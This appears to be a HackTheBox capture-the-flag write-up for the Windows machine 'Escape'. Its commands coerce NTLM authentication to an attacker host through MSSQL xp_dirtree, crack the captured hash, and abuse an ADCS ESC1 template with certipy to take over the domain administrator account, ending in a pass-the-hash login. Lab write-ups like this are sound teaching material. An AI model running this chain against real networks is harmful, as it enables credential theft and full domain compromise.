# Escape

**Platform:** HackTheBox · **Difficulty:** Medium · **OS:** Windows

An Active Directory machine: foothold via MSSQL, lateral movement with
credentials found in logs, and escalation to Domain Admin by abusing ADCS (ESC1).

## Enumeration

```bash
nmap -sC -sV -p- 10.10.11.x
```

Typical DC ports: 53, 88 (Kerberos), 389/636 (LDAP), 445 (SMB) and 1433 (MSSQL).

## Foothold

An SMB share accessible with a null session contains a PDF with guest
credentials for MSSQL. We connect:

```bash
impacket-mssqlclient PublicUser:'GuestUserCantWrite1'@10.10.11.x
```

We force NTLM authentication towards our `responder` with `xp_dirtree`:

```sql
EXEC xp_dirtree '\\10.10.14.x\share', 1, 1;
```

We capture the service account's NetNTLMv2 hash and crack it:

```bash
hashcat -m 5600 sql_svc.hash rockyou.txt
```

## Lateral movement

With `sql_svc` we get in over WinRM. In `C:\SQLServer\Logs\ERRORLOG.BAK` we find
a password mistakenly typed into the username field, belonging to `ryan.cooper`.

```bash
evil-winrm -i 10.10.11.x -u ryan.cooper -p 'Nuclear********'
```

## Escalation: ADCS (ESC1)

We enumerate vulnerable certificate templates with Certify:

```
Certify.exe find /vulnerable
```

The template lets the requester specify the `subjectAltName`, so we request a
certificate as `Administrator`:

```bash
certipy req -u ryan.cooper -p 'Nuclear********' \
  -ca sequel-DC-CA -template UserAuthentication \
  -upn administrator@sequel.htb
```

We use the certificate to obtain the administrator's NT hash via PKINIT:

```bash
certipy auth -pfx administrator.pfx
```

## Domain Admin

```bash
evil-winrm -i 10.10.11.x -u administrator -H <hash>
type C:\Users\Administrator\Desktop\root.txt
```

## Takeaways

- Null SMB sessions still leak sensitive information.
- Logs are a treasure trove of misplaced credentials.
- A misconfigured ADCS (ESC1) is a direct path to Domain Admin.
